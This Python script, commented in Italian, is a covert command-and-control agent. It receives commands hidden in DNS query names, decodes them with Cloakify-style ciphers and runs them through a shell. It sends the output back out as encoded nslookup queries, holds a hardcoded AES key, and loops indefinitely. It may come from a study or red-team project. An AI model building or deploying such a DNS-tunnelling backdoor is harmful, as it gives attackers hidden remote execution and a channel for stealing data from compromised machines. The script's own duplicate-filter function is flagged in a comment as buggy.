import subprocess
import os
import sys
import time
from aes_encrypt import decrypt_message, encrypt_message
from cloakify import Cloakify
from decloakify import Decloakify
from pcapCapture import *
from packetWhisper import TransferCloakedFile, ExtractDNSQueriesFromPCAP, ExtractPayloadFromDNSQueries

# Chiave AES (stessa chiave del client)
key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
cipher = "ciphers\\common_fqdn\\topWebsites"


def receive_command():
    print("Capturing pcap...")
    subprocess.call(['python', 'pcapCapture.py']) 
    print("pcap collected...")
    dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_command.pcap", osStr="Windows")
    cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
    cloaked_command = remove_dup_lines(cloakedFile, "_"+cloakedFile)
    os.remove(cloakedFile)
    os.rename("_"+cloakedFile, cloakedFile)
    cloaked_command = cloakedFile #"cloaked.payload"
    decloaked_command = "decloaked_command.txt"
    
    with open(cloaked_command, 'r') as file:
        if file.read().strip() == "":
            print("No command received.")
            return
        
    # Decloakificare il comando
    print("Decloakifying...")
    Decloakify(cloaked_command, cipher, decloaked_command)

    # Decrypt command
    with open(decloaked_command, 'r') as file:
        encrypted_command = file.read().strip()
    print("encrypted_command: ", encrypted_command)
    command = encrypted_command#decrypt_message(encrypted_command, key)
    
    
    # Eseguire il comando
    try:
        # Inviare la risposta crittografata
        time.sleep(1)
        send_response(subprocess.check_output(command, shell=True).decode('utf-8'))

    except Exception as e:
        print(f"Unrecognized command: {e}")
        time.sleep(1)
        send_response(f"Unrecognized command: {e}")

    # Rimuove il file di comando dopo l'elaborazione
    os.remove(cloaked_command)
    os.remove(decloaked_command)

def send_response(response):
    # Cifra la risposta
    encrypted_response = response#encrypt_message(response, key)

    # Cloakificare la risposta
    cloaked_response = "cloaked_response.txt"
    Cloakify(encrypted_response, cipher, cloaked_response)
    
    print("Initializing response transfer")
    TransferCloakedFile("cloaked_response.txt", 0.0)
    # Inviare la risposta tramite pacchetti DNS
    with open(cloaked_response, 'r') as file:
        for fqdn in file:
            fqdn_str = fqdn.strip()
            subprocess.call(['nslookup', fqdn_str])
    
    # Rimuove il file di risposta dopo l'invio
    os.remove(cloaked_response)

#DA FIXXARE: se appare un dominio già visto viene rimosso, ma dovrebbe essere rimosso solo e 
# soltanto se appare di seguito:
# es. 
#www.office.com
#www.office.com -> deve essere rimosso 
# ma non 
#www.office.com
#www.groupon.com
#www.target.com
#www.office.com -> non deve essere rimosso
def remove_dup_lines(file_input, file_output):
  with open(file_input, "r") as infile, open(file_output, "w") as outfile:
    previous_line = None
    for line in infile:
      if line != previous_line:  # Check for non-consecutive duplicates
        outfile.write(line)
      previous_line = line.rstrip("\n")  # Store previous line without newline

  return file_output
"""   with open(file_input, "r") as infile, open(file_output, "w") as outfile:
    previous_line = None
    for line in infile:
      if previous_line and line.rstrip("\n") != previous_line.rstrip("\n"):  # Check for non-consecutive duplicates
        print(line, previous_line)
        outfile.write(line)
      previous_line = line.rstrip("\n")  # Store previous line without newline

  return file_output """

if __name__ == "__main__":
    print("Server in attesa di richieste...")
    while True:
        receive_command() 


    

    
    
